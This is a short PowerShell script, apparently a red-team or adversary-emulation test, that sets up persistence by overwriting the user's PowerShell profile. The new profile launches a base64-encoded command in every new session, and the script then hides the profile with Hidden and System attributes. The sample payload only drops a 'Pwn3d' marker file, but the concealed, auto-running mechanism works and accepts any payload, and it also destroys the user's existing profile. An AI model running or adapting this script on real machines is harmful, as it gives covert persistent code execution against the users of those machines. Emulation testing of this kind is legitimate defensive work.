Write-Host "[*] Installing PowerShell profile persistence..." -ForegroundColor Cyan

$code = "Set-Content -Path 'C:\Users\Public\Documents\pwned.txt' -Value 'Pwn3d' -Force"
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($code))

# Create or modify PowerShell profile
$profileDir = Split-Path $PROFILE -Parent
if (-not (Test-Path $profileDir)) {
    New-Item -ItemType Directory -Path $profileDir -Force | Out-Null
}

# Write profile content
$profileContent = @"
# PowerShell Profile
Remove-Variable -Name profile -ErrorAction SilentlyContinue
powershell -NoProfile -Enc $encoded
"@

Set-Content -Path $PROFILE -Value $profileContent -Force
Write-Host "[PROFILE] Profile installed at: $PROFILE" -ForegroundColor Green

# Make profile hidden
try {
    (Get-Item $PROFILE -Force).Attributes = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
    Write-Host "[PROFILE] Profile set to Hidden + System" -ForegroundColor Green
} catch {}

Write-Host "[+] PowerShell profile persistence completed" -ForegroundColor Green
